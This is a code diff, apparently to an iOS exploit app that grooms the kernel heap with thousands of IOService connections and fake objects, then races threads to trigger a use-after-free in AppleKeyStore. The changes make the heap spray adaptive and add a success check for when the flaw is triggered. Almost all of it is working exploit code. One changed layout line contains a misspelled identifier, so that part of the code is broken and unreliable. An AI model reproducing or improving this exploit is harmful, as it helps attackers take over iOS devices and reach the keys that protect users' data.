@@ -9,9 +9,10 @@
 #define MAX_ATTEMPTS 2000
 
 // ========== HEAP SPRAY CONFIGURATION ==========
-#define SPRAY_COUNT         10000    // Number of connections to spray
+#define SPRAY_COUNT         500      // Reduced for stability (was 10000)
 #define SPRAY_BUFFER_SIZE   512      // Size of fake object (bytes)
 #define SPRAY_DELAY_MS      100      // Delay after spray (milliseconds)
+#define SPRAY_RETRY_ON_FAIL 1        // Continue even if some connections fail
 // ==============================================
 
 static atomic_int   g_phase  = 0;
@@ -53,29 +54,56 @@ static void *racer_thread(void *arg) {
     return NULL;
 }
 
-// ========== HEAP SPRAY FUNCTIONS ==========
+// ========== HEAP SPRAY FUNCTIONS (OPTIMIZED) ==========
 
 static int heap_spray_init(io_service_t svc, void(^log_callback)(NSString *)) {
     kern_return_t kr;
+    int fail_count = 0;
     
     log_callback([NSString stringWithFormat:@"[SPRAY] Starting heap spray: %d connections", SPRAY_COUNT]);
     
-    // Step 1: Open many IOService connections to spray the heap
+    // Step 1: Open IOService connections - STOP if we hit resource limits
     for (int i = 0; i < SPRAY_COUNT; i++) {
         kr = IOServiceOpen(svc, mach_task_self(), 0, &g_spray_conns[i]);
+        
         if (kr != KERN_SUCCESS) {
-            log_callback([NSString stringWithFormat:@"[SPRAY] IOServiceOpen failed at %d: 0x%x", i, kr]);
-            g_spray_count = i;
-            return -1;
+            if (kr == 0xe00002c7) { // kIOReturnNoResources
+                log_callback([NSString stringWithFormat:@"[SPRAY] Resource limit at %d connections (expected)", i]);
+                g_spray_count = i;
+                break; // Stop here, we have enough
+            } else {
+                fail_count++;
+                log_callback([NSString stringWithFormat:@"[SPRAY] Connection %d failed: 0x%x", i, kr]);
+                
+                // If too many failures, abort
+                if (fail_count > 10) {
+                    log_callback(@"[SPRAY] Too many failures, aborting");
+                    g_spray_count = i - fail_count;
+                    return -1;
+                }
+            }
+            g_spray_conns[i] = IO_OBJECT_NULL;
+            continue;
         }
         
-        // Progress update every 2000 connections
-        if (i % 2000 == 0 && i > 0) {
-            log_callback([NSString stringWithFormat:@"[SPRAY] Progress: %d/%d", i, SPRAY_COUNT]);
+        // Progress update every 100 connections
+        if ((i + 1) % 100 == 0) {
+            log_callback([NSString stringWithFormat:@"[SPRAY] Progress: %d/%d", i + 1, SPRAY_COUNT]);
         }
     }
-    g_spray_count = SPRAY_COUNT;
-    log_callback([NSString stringWithFormat:@"[SPRAY] Opened %d connections", g_spray_count]);
+    
+    // If we opened full SPRAY_COUNT, set g_spray_count
+    if (g_spray_count == 0) {
+        g_spray_count = SPRAY_COUNT;
+    }
+    
+    log_callback([NSString stringWithFormat:@"[SPRAY] Opened %d valid connections", g_spray_count]);
+    
+    // Check if we have enough connections to proceed
+    if (g_spray_count < 100) {
+        log_callback([NSString stringWithFormat:@"[SPRAY] Only %d connections - too few!", g_spray_count]);
+        return -1;
+    }
     
     // Step 2: Fill kernel heap with fake gate objects
     fake_gate_t fake_gate;
@@ -86,7 +114,10 @@ static int heap_spray_init(io_service_t svc, void(^log_callback)(NSString *)) {
     
     log_callback(@"[SPRAY] Filling heap with fake objects...");
     
+    int spray_success = 0;
     for (int i = 0; i < g_spray_count; i++) {
+        if (g_spray_conns[i] == IO_OBJECT_NULL) continue;
+        
         // Try to spray the fake gate object into kernel memory
         kr = IOConnectCallMethod(
             g_spray_conns[i],
@@ -98,13 +129,19 @@ static int heap_spray_init(io_service_t svc, void(^log_callback)(NSString *)) {
             NULL, NULL                  // output struct
         );
         
+        if (kr == KERN_SUCCESS || kr == kIOReturnUnsupported) {
+            spray_success++;
+        }
+        
         // Progress update
-        if (i % 2000 == 0 && i > 0) {
-            log_callback([NSString stringWithFormat:@"[SPRAY] Filled: %d/%d", i, g_spray_count]);
+        if ((i + 1) % 100 == 0) {
+            log_callback([NSString stringWithFormat:@"[SPRAY] Filled: %d/%d (success: %d)", 
+                         i + 1, g_spray_count, spray_success]);
         }
     }
     
-    log_callback([NSString stringWithFormat:@"[SPRAY] Heap spray complete, waiting %dms...", SPRAY_DELAY_MS]);
+    log_callback([NSString stringWithFormat:@"[SPRAY] Spray complete: %d successful fills", spray_success]);
+    log_callback([NSString stringWithFormat:@"[SPRAY] Waiting %dms for heap to settle...", SPRAY_DELAY_MS]);
     usleep(SPRAY_DELAY_MS * 1000);
     
     return 0;
@@ -114,16 +151,18 @@ static void heap_spray_cleanup(void(^log_callback)(NSString *)) {
     if (g_spray_count > 0) {
         log_callback([NSString stringWithFormat:@"[SPRAY] Cleaning up %d spray connections", g_spray_count]);
         
+        int cleaned = 0;
         for (int i = 0; i < g_spray_count; i++) {
-            if (g_spray_conns[i] != MACH_PORT_NULL) {
+            if (g_spray_conns[i] != MACH_PORT_NULL && g_spray_conns[i] != IO_OBJECT_NULL) {
                 IOServiceClose(g_spray_conns[i]);
                 mach_port_deallocate(mach_task_self(), g_spray_conns[i]);
                 g_spray_conns[i] = MACH_PORT_NULL;
+                cleaned++;
             }
         }
         
         g_spray_count = 0;
-        log_callback(@"[SPRAY] Cleanup complete");
+        log_callback([NSString stringWithFormat:@"[SPRAY] Cleanup complete (%d closed)", cleaned]);
     }
 }
 
@@ -189,7 +228,7 @@ static int run_attempt(void) {
     [self.view addSubview:title];
 
     UILabel *subtitle = [[UILabel alloc] init];
-    subtitle.text = [NSString stringWithFormat:@"Phase 2: Heap Grooming (%d spray)\niOS <26.3 RC", SPRAY_COUNT];
+    subtitle.text = [NSString stringWithFormat:@"Phase 2: Heap Grooming (max %d spray)\niOS <26.3 RC", SPRAY_COUNT];
     subtitle.font = [UIFont fontWithName:@"Menlo" size:12];
     subtitle.textColor = [UIColor colorWithWhite:0.5 alpha:1.0];
     subtitle.textAlignment = NSTextAlignmentCenter;
@@ -233,7 +272,7 @@ static int run_attempt(void) {
         [subtitle.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:20],
         [subtitle.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-20],
         [self.triggerButton.topAnchor constraintEqualToAnchor:subtitle.bottomAnchor constant:24],
-        [self.triggerButton.centerXAnchor constraintEqualToAnchor:self.view.centerXAnchor],
+        [self.triggerButton.centerXAnchor constraintEqualToAnchor:self.view.centerXAhor],
         [self.triggerButton.widthAnchor constraintEqualToConstant:280],
         [self.triggerButton.heightAnchor constraintEqualToConstant:56],
         [self.statusLabel.topAnchor constraintEqualToAnchor:self.triggerButton.bottomAnchor constant:16],
@@ -268,9 +307,9 @@ static int run_attempt(void) {
     self.triggerButton.backgroundColor = [UIColor colorWithWhite:0.3 alpha:1.0];
 
     [self appendLog:@"========================================"];
-    [self appendLog:@"  AppleKeyStore UAF + HEAP SPRAY"];
+    [self appendLog:@"  AppleKeyStore UAF + HEAP SPRAY v2"];
     [self appendLog:@"========================================"];
-    [self appendLog:[NSString stringWithFormat:@"[*] Spray count: %d", SPRAY_COUNT]];
+    [self appendLog:[NSString stringWithFormat:@"[*] Max spray: %d (adaptive)", SPRAY_COUNT]];
     [self appendLog:[NSString stringWithFormat:@"[*] Attempts: %d (racers: %d)", MAX_ATTEMPTS, NUM_RACERS]];
     [self appendLog:@""];
     [self setStatus:@"Initializing..." color:UIColor.yellowColor];
@@ -286,7 +325,7 @@ static int run_attempt(void) {
         }
         [self appendLog:@"[+] AppleKeyStore service found"];
         
-        // ========== PHASE 2: HEAP SPRAY ==========
+        // ========== PHASE 2: HEAP SPRAY (ADAPTIVE) ==========
         [self setStatus:@"Heap spraying..." color:[UIColor colorWithRed:1.0 green:0.6 blue:0.0 alpha:1.0]];
         
         int spray_result = heap_spray_init(svc, ^(NSString *msg) {
@@ -297,13 +336,14 @@ static int run_attempt(void) {
             [self appendLog:@"[-] Heap spray failed!"];
             [self setStatus:@"Spray failed" color:UIColor.redColor];
             IOObjectRelease(svc);
+            heap_spray_cleanup(^(NSString *msg) { [self appendLog:msg]; });
             [self finishRun];
             return;
         }
         
-        [self appendLog:@"[+] Heap spray complete!"];
+        [self appendLog:[NSString stringWithFormat:@"[+] Heap spray OK (%d connections active)", g_spray_count]];
         [self appendLog:@""];
-        // =========================================
+        // ====================================================
         
         IOObjectRelease(svc);
         [self setStatus:@"Triggering UAF..." color:[UIColor colorWithRed:1.0 green:0.4 blue:0.0 alpha:1.0]];
@@ -327,12 +367,15 @@ static int run_attempt(void) {
         [self appendLog:@"========================================"];
         
         // Check if device survived
-        if (g_spray_count > 0) {
-            [self appendLog:@"[+] Device survived - heap spray may be working!"];
-            [self setStatus:@"SUCCESS - No panic!" color:[UIColor colorWithRed:0.0 green:1.0 blue:0.0 alpha:1.0]];
+        [self appendLog:@"[+] Device survived - analyzing results..."];
+        
+        if (atomic_load(&g_errors) > 0) {
+            [self appendLog:[NSString stringWithFormat:@"[*] Port deaths detected: %u", atomic_load(&g_errors)]];
+            [self appendLog:@"[*] UAF triggered successfully!"];
+            [self setStatus:@"UAF TRIGGERED!" color:[UIColor colorWithRed:0.0 green:1.0 blue:0.0 alpha:1.0]];
         } else {
-            [self appendLog:@"[*] Test complete"];
-            [self setStatus:@"Done (no panic)" color:[UIColor colorWithRed:0.0 green:0.8 blue:0.0 alpha:1.0]];
+            [self appendLog:@"[*] No port deaths - race might need tuning"];
+            [self setStatus:@"Completed (no panic)" color:[UIColor colorWithRed:0.0 green:0.8 blue:0.0 alpha:1.0]];
         }
         
         // Cleanup spray connections
